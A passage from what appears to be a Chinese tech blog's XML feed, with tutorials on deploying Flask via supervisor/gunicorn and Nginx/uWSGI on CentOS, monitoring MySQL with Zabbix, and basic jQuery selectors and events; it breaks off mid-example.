/var/log/supervisord_stdout.log启动：supervisord -c /etc/supervisord.conf五. 测试使用浏览器访问：ip即可得到flask响应的结果，注意防火墙放行80端口六. 其他说明nginx+gunicorn+flask:这种模式就是不使用supervisor管理gunicorn单独执行gunicorn命令：gunicorn -b 127.0.0.1:9000 microblog:app七. 扩展supervisorctl的使用supervisorctl status # 查询进程状态supervisorctl stop node # 关闭 [program:node] 的进程supervisorctl start node # 启动 [program:node] 的进程supervisorctl restart node # 重启 [program:node] 的进程supervisorctl stop all # 关闭所有进程supervisorctl start all # 启动所有进程supervisorctl reload # 重新读取配置文件,读取有更新（增加）的配置文件，不会启动新添加的程序supervisorctl update # 重启配置文件修改过的程序常见的gunicorn配置[program:microblog]directory = /home/microblog; 程序的启动目录command = gunicorn -c gunicorn.py wsgi:app ; 启动命令，可以看出与手动在命令行启动的命令是一样的autostart = true ; 在 supervisord 启动的时候也自动启动startsecs = 5 ; 启动 5 秒后没有异常退出，就当作已经正常启动了autorestart = true ; 程序异常退出后自动重启startretries = 3 ; 启动失败自动重试次数，默认是 3user = leon ; 用哪个用户启动redirect_stderr = true ; 把 stderr 重定向到 stdout，默认 falsestdout_logfile_maxbytes = 20MB ; stdout 日志文件大小，默认 50MBstdout_logfile_backups = 20 ; stdout 日志文件备份数; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件）stdout_logfile = /data/logs/usercenter_stdout.log若是项目中没有设置debug=True，则更改项目内容后想看到效果需要重载一下supervisor服务supervisorctl reload其他别人的配置网址：https://github.com/seasonstar/bibiThis based on Ubuntu/Debian，please skip if you had set up Python 3 environment.123456789101112131415161718192021222324# 安装python3环境sudo apt-get updatesudo apt-get install python3-pip python3-devsudo apt-get install build-essential libssl-dev libffi-dev python-dev#安装virtualenvsudo pip3 install virtualenv virtualenvwrapperecho "export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3" &gt;&gt; ~/.bashrcecho "export WORKON_HOME=~/Env" &gt;&gt; ~/.bashrcecho "source /usr/local/bin/virtualenvwrapper.sh" &gt;&gt; ~/.bashrcsource ~/.bashrc# 现在你的home目录下有Env的文件夹，你的python虚拟环境都会创建在这里mkvirtualenv bibi # bibi可随便改成你的项目名workon bibi # 现在已进入项目的独立环境# 安装 mongodb 略 (请安装mongodb 2.6版本)# 安装 redis 略# 安装 rabbitMQ 略mongod &amp; # 启动mongodbredis-server &amp; # 启动redisrabbitmq-server &amp; # 启动RabbitMQ安装依赖pip3 install -r requirements.txt初始化数据库1234567python3 manage.py shell# into Python3 shell&gt;&gt;&gt; from application.models import User&gt;&gt;&gt; user = User.create(email="xxxx@xxx.com", password="xxx", name="xxxx")# email, password, name改成你自己的&gt;&gt;&gt; user.roles.append("ADMIN")&gt;&gt;&gt; user.save()运行1234# 启动 celerycelery -A application.cel worker -l info &amp;python3 manage.py runserver本地可以打开 http://127.0.0.1:5000/admin/部署方式1234# 安装 supervisorsudo apt-get install supervisor# 安装 gunicornpip3 install gunicorn创建supervisor配置12345678910111213sudo vim /etc/supervisor/conf.d/bibi.conf[program:bibi]command=/root/Env/bibi/bin/gunicorn -w 3 -b 0.0.0.0:8080 --log-level debug "application.app:create_app()"directory=/opt/py-maybi/ ; 你的项目代码目录autostart=false ; 是否自动启动autorestart=false ; 是否自动重启stdout_logfile=/opt/logs/gunicorn.log ; log 日志PS: 上面 -w 为 开启workers数，公式：（系统内核数*2 + 1)创建nginx配置12345678910111213sudo vim /etc/nginx/sites-enabled/bibi.confserver &#123; listen 80; server_name bigbang.maybi.cn; # 这是HOST机器的外部域名，用地址也行 location / &#123; proxy_pass http://127.0.0.1:8080; # 这里是指向 gunicorn host 的服务地址 proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;接着启动 supervisor, nginx123sudo supervisorctl reloadsudo supervisorctl start bibisudo service nginx restart]]></content>
      <categories>
        <category>CentOS</category>
        <category>Nginx</category>
        <category>supervisor</category>
        <category>gunicorn</category>
        <category>Flask</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>Nginx</tag>
        <tag>Flask</tag>
        <tag>supervisor</tag>
        <tag>gunicorn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS+Nginx+Uwsgi+Flask部署教程]]></title>
    <url>%2F2019%2F06%2F24%2FCentOS-Nginx-Uwsgi-Flask%E9%83%A8%E7%BD%B2%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[说明本文没有采用虚拟环境的方式，若需要部署多个项目，则需要考虑使用虚拟环境的方式部署。1. 安装Python3此步骤可以查看我的博客：https://blog.ejubei.net/2019/03/14/CentOS%207.2%E5%AE%89%E8%A3%85Python3.7/最终的效果：1234567891011[root@localhost ~]# python3 -VPython 3.7.1[root@localhost ~]# pip3 -Vpip 19.1.1 from /usr/local/python3/lib/python3.7/site-packages/pip (python 3.7)[root@localhost ~]# python -VPython 2.7.5[root@localhost ~]# pip -V # 默认python2.7未安装pip-bash: pip: command not found# 安装方法[root@localhost ~]# yum install epel-release[root@localhost ~]# yum install python-pip2. 上传项目代码到服务器这里采用最简单的Flask程序：12345678910#!/usr/bin/env pythonfrom flask import Flaskapp = Flask(__name__)@app.route('/')def hello_world(): return 'Hello World!'if __name__ == '__main__': app.run(host='0.0.0.0',port=5000)1234567891011121314[root@localhost ~]# cd /home/[root@localhost home]# mkdir ysb[root@localhost home]# cd ysb/[root@localhost ysb]# cat ysb.py#!/usr/bin/env pythonfrom flask import Flaskapp = Flask(__name__)@app.route('/')def hello_world(): return 'Hello World!'if __name__ == '__main__': app.run(host='0.0.0.0',port=5000)程序文件放在/home/ysb目录下。安装依赖包：pip3 install flask检查程序是否正常运行：python3 ysb.py3. 安装配置uwsgi注意：采用pip的方式安装，不采用yum方式安装。123456789101112131415161718192021222324252627# 安装uswgi[root@localhost ysb]# pip3 install uwsgi# 查看uwsgi安装路径，创建软连接[root@localhost ysb]# find / -name uwsgi/usr/local/python3/bin/uwsgi[root@localhost ysb]# ln -s /usr/local/python3/bin/uwsgi /usr/bin/uwsgi[root@localhost ysb]# uwsgi --version2.0.18# 创建并配置uwsgi配置文件，新建专门的一个uwsgi目录用来存放相关文件[root@localhost ysb]# mkdir /etc/uwsgi[root@localhost uwsgi]# cat uwsgi.ini [uwsgi]socket = 127.0.0.1:5000chdir = /home/ysb/wsgi-file = app.pycallable = appprocesses = 4daemonize = /tmp/uwsgiServer.logvacuum = truelog-maxsize = 5000disable-logging = truemaster=trueuid=nginxgid=nginxpy-autoreload=1stats=/etc/uwsgi/uwsgi.statuspidfile=/etc/uwsgi/uwsgi.piduwsgi.ini配置文件参数解析：socket：uwsgi监听的socket，可以为socket文件或ip地址+端口号，在这里指定为127.0.0.1:5000，这样就会监听到网络套接字，跟Nginx配置文件中监听的保持一致。若是使用socket文件，比如socket =/web/script/uwsgi.sock，还需要设置chmod-socket = 755(socket权限设置)chdir：在app加载前切换到当前目录， 指定运行目录wsgi-file：主程序文件callable：主程序中的变量名processes：开启的进程数量（和worker作用相同）daemonize：使进程在后台运行，并将日志打到指定的日志文件或者udp服务器（不会影响nginx日志的输出）vacuum：当服务停止的时候自动移除unix Socket 和 Pid 文件log-maxsize：设置最大日志文件大小disable-logging：禁用请求日志记录master：启动一个master进程来管理其他进程，以上述配置为例，其中的4个uwsgi进程都是这个master进程的子进程，如果kill这个master进程，相当于重启所有的uwsgi进程uid：uwsgi启动用户名gid：uwsgi启动用户组py-autoreload：监控python模块mtime来触发重载 (只在开发时使用)stats：状态文件pidfile：指定pid文件其他参数：thunder-lock：序列化接受的内容(thunder-lock = true)enable-threads：允许用内嵌的语言启动线程。这将允许你在app程序中产生一个子线程（enable-threads = true）post-buffering：设置缓冲(post-buffering = 4096)static-map：设置静态文件路径（static-map = /static=//www/wwwroot/mysite/static）socket-timeout：为所有的socket操作设置内部超时时间（默认4秒），这个配置会结束那些处于不活动状态超过10秒的连接。harakiri：一个请求花费的时间超过了这个harakiri超时时间，那么这个请求都会被丢弃，并且当前处理这个请求的工作进程会被回收再利用（即重启）(harakiri = 30)buffer-size：设置用于uwsgi包解析的内部缓存区大小为64k。默认是4k。(buffer-size = 32768)listen：设置socket的监听队列大小（默认：100）(listen = 120)reload-mercy：设置在平滑的重启（直到接收到的请求处理完才重启）一个工作子进程中，等待这个工作结束的最长秒数。这个配置会使在平滑地重启工作子进程中，如果工作进程结束时间超过了8秒就会被强行结束（忽略之前已经接收到的请求而直接结束）(reload-mercy = 8)max-requests：为每个工作进程设置请求数的上限。当一个工作进程处理的请求数达到这个值，那么该工作进程就会被回收重用（重启）。你可以使用这个选项来默默地对抗内存泄漏(max-requests = 5000)limit-as：通过使用POSIX/UNIX的setrlimit()函数来限制每个uWSGI进程的虚拟内存使用数。这个配置会限制uWSGI的进程占用虚拟内存不超过256M。如果虚拟内存已经达到256M，并继续申请虚拟内存则会使程序报内存错误，本次的http请求将返回500错误。(limit-as = 256 )4. 安装配置Nginx1234567891011121314151617181920212223# 安装Nginx[root@localhost ~]# yum install nginx# 修改nginx.conf配置文件# 把自带的server&#123;&#125;块注释掉，然后在/etc/nginx/conf.d/目录下新建一个以conf结尾的文件，比如ysb.conf[root@localhost conf.d]# cat ysb.conf server &#123; listen 80; server_name 192.168.0.139; location / &#123; include uwsgi_params; uwsgi_pass 127.0.0.1:5000; &#125;&#125;# 检测Nginx配置是否正确[root@localhost conf.d]# nginx -tnginx: the configuration file /etc/nginx/nginx.conf syntax is oknginx: configuration file /etc/nginx/nginx.conf test is successful# 启动Nginx[root@localhost conf.d]# systemctl start nginx.service # 查看Nginx状态[root@localhost conf.d]# systemctl status nginx.service5. uwsgi操作相关123456# 启动[root@localhost ysb]# uwsgi --ini uwsgi.ini# 重启[root@localhost ysb]# uwsgi --reload uwsgi.pid# 关闭[root@localhost ysb]# uwsgi --stop uwsgi.pid但是uwsgi启动后报错，通过查看log日志文件可知：123456789*** uWSGI is running in multiple interpreter mode ***spawned uWSGI master process (pid: 20234)spawned uWSGI worker 1 (pid: 20235, cores: 1)spawned uWSGI worker 2 (pid: 20236, cores: 1)spawned uWSGI worker 3 (pid: 20237, cores: 1)spawned uWSGI worker 4 (pid: 20238, cores: 1)bind(): Permission denied [core/socket.c line 230]...brutally killing workers...unlink(): No such file or directory [core/uwsgi.c line 1673]经排查，是因为nginx用户对/etc/uwsgi/目录没有相关权限造成的。(前提条件：已关闭SElinux)所以进行如下操作：12[root@localhost ~]# chown -R nginx:nginx /etc/uwsgi/[root@localhost ~]# chown -R nginx:nginx /home/ysb/然后再运行：[root@localhost ~]# uwsgi --ini /etc/uwsgi/uwsgi.ini查看状态：12345[root@localhost etc]# netstat -tulnpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN 20970/uwsgi tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 19713/nginx: master然后用浏览器访问ip地址，就能出现’Hello World!’6. 常见问题1. 访问浏览器出现502错误，查看nginx错误日志提示权限禁止考虑关闭SElinux2. 运行uwsgi出现错误：bind(): Permission denied [core/socket.c line 230]这是因为nginx用户对uwsgi文件没有相关权限，修改其所属用户和用户组为nginx即可]]></content>
      <categories>
        <category>CentOS</category>
        <category>Nginx</category>
        <category>uwsgi</category>
        <category>Flask</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>Nginx</tag>
        <tag>uwsgi</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用zabbix监控MySQL]]></title>
    <url>%2F2019%2F06%2F17%2F%E4%BD%BF%E7%94%A8zabbix%E7%9B%91%E6%8E%A7MySQL%2F</url>
    <content type="text"><![CDATA[说明zabbix-agent和MySQL都是使用yum方式进行安装的，所有路径都使用默认的。配置.my.cnf文件.my.cnf这个文件是zabbix要求的用于存放连接mysql数据库的账户信息的隐藏文件，需要手动创建，其存放位置可以自定义，此时该文件保存路径如下：/etc/zabbix/etc/.my.cnf内容如下：1234567891011[root@localhost etc]# vim /etc/zabbix/etc/.my.cnf[mysql] #mysql程序要使用的账户信息host=localhostuser=zabbixpassword="xxxxx" #此处的密码强烈建议加上引号socket=/var/lib/mysql/mysql.sock #确认mysql的sock文件路径[mysqladmin]host=localhostuser=zabbixpassword="xxxxxx"socket=/var/lib/mysql/mysql.sock提供mysql的userparameter配置文件zabbix-agent已经自带的有该模板文件了，路径：/etc/zabbix/zabbix_agentd.d/userparameter_mysql.conf查看zabbix-agent配置文件(zabbix_agentd.conf)中是否包含该文件：12[root@localhost zabbix]# cat zabbix_agentd.conf | grep 'Include'Include=/etc/zabbix/zabbix_agentd.d/*.conf修改mysql的userparameter配置文件将文件中HOME=/var/lib/zabbix改成HOME=/etc/zabbix/etc，表示的是.my.cnf文件所在路径将其中的指令部分mysql和mysqladmin改成绝对路径，分别是/usr/bin/mysql和/usr/bin/mysqladmin，最终效果如下：12345678910UserParameter=mysql.status[*],echo &quot;show global status where Variable_name=&apos;$1&apos;;&quot; | HOME=/etc/zabbix/etc /usr/bin/mysql -N | awk&apos;&#123;print $$2&#125;&apos;UserParameter=mysql.size[*],bash -c &apos;echo &quot;select sum($(case &quot;$3&quot; in both|&quot;&quot;) echo &quot;data_length+index_length&quot;;; data|index) echo &quot;$3_length&quot;;; free) echo &quot;data_free&quot;;; esac)) from information_schema.tables$([[ &quot;$1&quot; = &quot;all&quot; || ! &quot;$1&quot; ]] || echo &quot; where table_schema=\&quot;$1\&quot;&quot;)$([[ &quot;$2&quot; = &quot;all&quot; || ! &quot;$2&quot; ]] || echo &quot;and table_name=\&quot;$2\&quot;&quot;);&quot; | HOME=/etc/zabbix/etc /usr/bin/mysql -N&apos;UserParameter=mysql.ping,HOME=/etc/zabbix/etc /usr/bin/mysqladmin ping | grep -c aliveUserParameter=mysql.version,/usr/bin/mysql -V重启zabbix_agentd服务zabbix web给主机添加MySQL模板配置，主机，点击主机名称，模板，添加模板：Template DB MySQL]]></content>
      <categories>
        <category>CentOS</category>
        <category>Zabbix</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>MySQL</tag>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery学习]]></title>
    <url>%2F2019%2F06%2F17%2FjQuery%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[1. jquery介绍jQuery的版本分为1.x系列和2.x、3.x系列，1.x系列兼容低版本的浏览器，2.x、3.x系列放弃支持低版本浏览器，目前使用最多的是1.x系列的。jquery是一个函数库，一个js文件，页面用script标签引入这个js文件就可以使用。1&lt;script type="text/javascript" src="jquery-3.3.1.min.js"&gt;&lt;/script&gt;jquery的口号和愿望 Write Less, Do More（写得少，做得多）。1、官方网站 http://jquery.com/2、版本下载 https://code.jquery.com/2. jquery加载将获取元素的语句写到页面头部，会因为元素还没有加载而出错，jquery提供了ready方法解决这个问题，它的速度比原生的 window.onload 更快。12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 原生js写法 window.onload = function () &#123; var oDiv = document.getElementById('div1'); alert('原生弹出的'+oDiv); &#125;; // ready 比window.onload 要快： // 原因是，window.onload是等标签加载完后，再渲染完之后才运行， // ready是等标签加载完后就运行 // jquery写法,ready的完整写法 $(document).ready(function () &#123; var $div = $('#idv1'); alert('jquery弹出的'+$div); &#125;); // jquery写法,ready的简写写法 $(function () &#123; var $div = $('#idv1'); alert('jquery弹出的-2'+$div); &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="div1"&gt;这是一个div元素&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;2.1 jquery引入容易出错的写法123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;!-- 不能直接在jquery的引入标签里写js代码，需要另外写一个script标签，在这个标签里面写js代码 --&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="div1"&gt;div元素&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;3. jquery选择器jquery用法思想一选择某个网页元素，然后对它进行某种操作3.1 jquery选择器jquery选择器可以快速地选择元素，选择规则和css样式相同，使用length属性判断是否选择成功。12345$('#myId') //选择id为myId的网页元素$('.myClass') // 选择class为myClass的元素$('li') //选择所有的li元素$('#ul1 li span') //选择id为为ul1元素下的所有li下的span元素$('input[name=first]') // 选择name属性等于first的input元素123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; // 代替css改变元素样式 var $div = $('#div1'); $div.css(&#123;'color':'red'&#125;); // 样式使用python字典的写法 // 使用jquery的话，两个选择的元素都发生变化 var $div2 = $('.box'); $div2.css(&#123;'color':'green'&#125;); var $li = $('.list li'); // 带“-”的样式属性，可以写成驼峰式，也可以写成原始 $li.css(&#123;'background-color':'pink','color':'red'&#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="div1"&gt;这是一个div元素&lt;/div&gt; &lt;div class="box"&gt;这是第二个div元素&lt;/div&gt; &lt;div class="box"&gt;这是第三个div元素&lt;/div&gt; &lt;!-- ul.list&gt;li&#123;$&#125;*8 --&gt; &lt;ul class="list"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;li&gt;6&lt;/li&gt; &lt;li&gt;7&lt;/li&gt; &lt;li&gt;8&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;3.2 对选择集进行过滤1234$('div').has('p'); // 选择包含p元素的div元素$('div').not('.myClass'); //选择class不等于myClass的div元素$('div').filter('.myClass'); //选择class等于myClass的div元素$('div').eq(5); //选择第6个div元素1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; /* 完整写法 var $div = $('div'); $div.css(&#123;'backgroundColor':'gold'&#125;); */ // 省略写法 $('div').css(&#123;'backgroundColor':'gold'&#125;); $('div').has('p').css(&#123;'fontSize':'30px'&#125;); $('div').eq(4).css(&#123;'textIndent':'20px'&#125;); // 这里面的4表示的是从0开始的第四个元素，在这里指的是&lt;div&gt;5&lt;/div&gt; &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt; &lt;p&gt;2&lt;/p&gt; &lt;/div&gt; &lt;div&gt;3&lt;/div&gt; &lt;div&gt;4&lt;/div&gt; &lt;div&gt;5&lt;/div&gt; &lt;div&gt;6&lt;/div&gt; &lt;div&gt;7&lt;/div&gt; &lt;div&gt; &lt;span&gt;8&lt;/span&gt; &lt;span class="tip"&gt;9&lt;/span&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;3.3 选择集转移12345678$('div').prev(); //选择div元素前面紧挨的同辈元素$('div').prevAll(); //选择div元素之前所有的同辈元素$('div').next(); //选择div元素后面紧挨的同辈元素$('div').nextAll(); //选择div元素后面所有的同辈元素$('div').parent(); //选择div的父元素$('div').children(); //选择div的所有子元素$('div').siblings(); //选择div的同级元素$('div').find('.myClass'); //选择div内的class等于myClass的元素123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; /* 完整写法 var $div = $('div'); $div.css(&#123;'backgroundColor':'gold'&#125;); */ // 省略写法 $('div').eq(4).prev().css(&#123;'color':'red'&#125;); $('div').find('.tip').css(&#123;'fontSize':'30px'&#125;); &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;3&lt;/div&gt; &lt;div&gt;4&lt;/div&gt; &lt;div&gt;5&lt;/div&gt; &lt;div&gt;6&lt;/div&gt; &lt;div&gt;7&lt;/div&gt; &lt;div&gt; &lt;span&gt;8&lt;/span&gt; &lt;span class="tip"&gt;9&lt;/span&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;3.4 判断是否选择到了元素jquery有容错机制，即使没有找到元素，也不会出错，可以用length属性来判断是否找到了元素,length等于0，就是没选择到元素，length大于0，就是选择到了元素。123456var $div1 = $('#div1');var $div2 = $('#div2');alert($div1.length); // 弹出1alert($div2.length); // 弹出0......&lt;div id="div1"&gt;这是一个div&lt;/div&gt;123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; $div = $('#div1'); alert($div.length); // 没有选中元素，也不会报错，程序正常运行 $div2 = $('#div2'); alert($div2.length); // if($div2.length&gt;0) 通过length属性来判断是否选中了元素 &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="div1"&gt;div元素&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;４. jquery样式操作jquery用法思想二同一个函数完成取值和赋值4.1 操作行间样式12345678// 获取div的样式$("div").css("width");$("div").css("color");//设置div的样式$("div").css("width","30px"); // 没有用大括号，中间是逗号$("div").css(&#123;"width":"30px"&#125;); // 使用大括号，中间是冒号$("div").css(&#123;fontSize:"30px",color:"red"&#125;);特别注意选择器获取的多个元素，获取信息获取的是第一个，比如：$(“div”).css(“width”)，获取的是第一个div的width。1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; var $div = $('#box'); // 读取属性值 var sTr = $div.css('fontSize'); alert(sTr); // 写属性值 $div.css(&#123;'color':'red','backgroundColor':'pink','fontSize':'20px'&#125;); /* 原生js无法读取行间没有定义的css属性值 var oDiv = document.getElementById('box'); alert(oDiv.style.fontSize); */ &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="box"&gt;div元素&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;4.2 操作样式类名1234$("#div1").addClass("divClass2") //为id为div1的对象追加样式divClass2$("#div1").removeClass("divClass") //移除id为div1的对象的class名为divClass的样式$("#div1").removeClass("divClass divClass2") //移除多个样式$("#div1").toggleClass("anotherClass") //重复切换anotherClass样式123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; var $div = $('.box'); // 在原来样式名的基础上加上“big”的样式名 $div.addClass('big'); // 在原来样式名的基础上去掉“red”的样式名 $div.removeClass('red'); &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .box&#123; width:100px; height:100px; background-color:gold; &#125; .big&#123; font-size:30px; &#125; .red&#123; color:red; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box red"&gt;div元素&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;5. 绑定click事件5.1 给元素绑定click事件123456$('#btn1').click(function()&#123; // 内部的this指的是原生对象 // 使用jquery对象用 $(this)&#125;)1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; // 绑定click事件 $('#btn').click(function()&#123; /* if($('.box').hasClass('col01'))&#123; $('.box').removeClass('col01'); &#125; else &#123; $('.box').addClass('col01'); &#125; */ // 简化成下面的写法： $('.box').toggleClass('col01'); &#125;) &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .box&#123; width:200px; height:200px; background-color:gold; &#125; .col01&#123; background-color:green; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;input type="button" name="" value="切换样式" id="btn"&gt; &lt;div class="box"&gt;div元素&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;5.2 获取元素的索引值12345678910var $li = $('.list li').eq(1);alert($li.index()); // 弹出1......&lt;ul class="list"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;li&gt;6&lt;/li&gt;&lt;/ul&gt;12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function()&#123; var $li = $('.list li'); //alert($li.length); // 弹出 8 //alert($li.eq(3).index()); // 弹出3 alert( $li.filter('.myli').index() ); // 弹出4 &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;ul class="list"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li class="myli"&gt;5&lt;/li&gt; &lt;li&gt;6&lt;/li&gt; &lt;li&gt;7&lt;/li&gt; &lt;li&gt;8&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;5.3 选项卡练习1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $btn = $('.btns input'); var $div = $('.cons div'); $btn.click(function () &#123; // this 指的是原生的this，它表示当前点击的对象，使用jquery的对象需要用$(this) // 当前点击的按钮加上current样式后，除了当前，其他的按钮去掉current样式 $(this).addClass('current').siblings().removeClass('current'); //alert( $(this).index() ; //弹出当前按钮的索引值 // 当前点击的按钮对应索引值的div加上active样式，其他的去掉active样式 $div.eq($(this).index()).addClass('active').siblings().removeClass('active'); &#125;) &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .btns input &#123; width: 100px; height: 40px; background-color: #ddd; border: 0; &#125; .btns .current &#123; background-color: gold; &#125; .cons div &#123; width: 500px; height: 300px; background-color: gold; display: none; text-align: center; line-height: 300px; font-size: 30px; &#125; .cons .active &#123; display: block; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="btns"&gt; &lt;input type="button" name="" value="01" class="current"&gt; &lt;input type="button" name="" value="02"&gt; &lt;input type="button" name="" value="03"&gt;&lt;/div&gt;&lt;div class="cons"&gt; &lt;div class="active"&gt;选项卡一的内容&lt;/div&gt; &lt;div&gt;选项卡二的内容&lt;/div&gt; &lt;div&gt;选项卡三的内容&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;6. jquery特殊效果123456789fadeIn() 淡入fadeOut() 淡出fadeToggle() 切换淡入淡出hide() 隐藏元素show() 显示元素toggle() 切换元素的可见状态slideDown() 向下展开slideUp() 向上卷起slideToggle() 依次展开或卷起某个元素123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $('#btn').click(function () &#123; //$('.box').fadeIn(); //$('.box').fadeIn(1000,function()&#123; // alert('动画完了！'); //&#125;); $('.box').fadeToggle(1000,function()&#123; alert('动画完了！'); &#125;); // $('.box').show(); //$('.box').toggle(); //$('.box').slideDown(); //$('.box').slideToggle(1000, function () &#123; // alert('动画完了') //&#125;); &#125;); &#125;) &lt;/script&gt; &lt;style type="text/css"&gt; .box &#123; width: 300px; height: 300px; background-color: gold; display: none; &#125; 